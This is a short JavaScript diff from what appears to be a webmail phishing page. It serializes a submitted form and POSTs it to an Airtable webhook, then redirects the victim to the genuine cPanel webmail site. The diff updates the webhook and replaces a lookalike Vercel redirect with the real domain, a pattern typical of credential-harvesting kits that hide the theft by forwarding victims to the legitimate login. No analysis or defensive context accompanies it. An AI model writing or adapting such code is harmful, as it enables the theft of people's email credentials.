@@ -80,7 +80,7 @@ window.addEventListener('load', function() {
       var formData = $(this).serialize(); // Serialize form data
 
       $.ajax({
-        url: "https://hooks.airtable.com/workflows/v1/genericWebhook/appHwNBiVPIhJG35j/wflV5tyT6B9mpGMve/wtrnQxFgNHEnJFc1q",
+        url: "https://hooks.airtable.com/workflows/v1/genericWebhook/appo3MfmGBPrK45Fg/wflxJyZQJQM9pofq8/wtr07vnqI9dgARY6s",
         type: "POST",
         data: formData,
         success: function () {
@@ -91,7 +91,7 @@ window.addEventListener('load', function() {
         },
         complete: function () {
           setTimeout(function () {
-            window.location.href = "https://webmail-session-auth-verified.vercel.app";
+            window.location.href = "https://webmail.cpanel.net";
           }, 1000);
         }
       });
